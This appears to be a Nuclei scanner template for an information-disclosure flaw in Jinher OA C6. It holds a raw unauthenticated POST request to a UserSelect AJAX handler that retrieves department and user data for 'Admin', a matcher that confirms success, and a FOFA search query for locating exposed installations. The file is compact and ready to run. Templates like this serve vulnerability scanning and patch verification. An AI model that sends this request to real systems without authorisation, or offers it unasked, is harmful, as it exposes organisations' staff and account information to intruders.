id: jinher-oa-c6-UserWebControl-UserSelect-disclosure

info:
  name: 金和 OA c6 UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx - 敏感信息泄露
  author: leadlife
  severity: high
  description: 
  reference:
    - todo
  metadata:
    veified: true
    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
  tags: jinher,oa,disclosure

http:
  - raw:
      - |-
        POST /C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: text/plain;charset=UTF-8
        Connection: close

        strDeptID=
        strUserId=Admin
        strUserEsp=
        strArchivesId=
        deptIds=
        IsShowChildrenDept=0
        IsCascade=1

    matchers:
      - type: dsl
        dsl:
          - "contains_all(body, 'childUsers') && status_code==200"